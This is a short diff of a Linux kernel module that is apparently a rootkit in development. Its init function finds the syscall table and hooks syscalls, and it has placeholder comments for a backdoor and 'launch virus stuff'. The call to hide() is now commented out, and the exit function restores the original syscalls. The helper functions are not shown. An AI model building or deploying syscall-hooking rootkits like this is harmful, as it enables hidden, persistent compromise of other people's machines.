@@ -17,20 +17,23 @@ void **sys_call_table;
 struct sysinfo *info;
 
 static int __init lkm_example_init(void) {
-    printk(KERN_INFO "Hello, World!\n");
+    //finding syscall table
     sys_call_table = find_syscall_table();
-    pr_info("Found sys_call_table at %p\n", sys_call_table);
-
+    //re-place syscalls with our own
     update_sys_calls(sys_call_table);
 
-    //TODO uncomment to hide the rootkit on launch
-    hide();
+    //create backdoor connection
+        //launch backdoor
+
+    //Hide rootkit and launch virus stuff (UNCOMMENT FOR AUTOMATION OF THIS)
+    //hide();
+    //launch virus
+
     return 0;
 }
 
 static void __exit lkm_example_exit(void) {
-    printk(KERN_INFO "Goodbye, World!\n");
-
+    //re-load original syscalls
     revert_to_original(sys_call_table);
 }
 
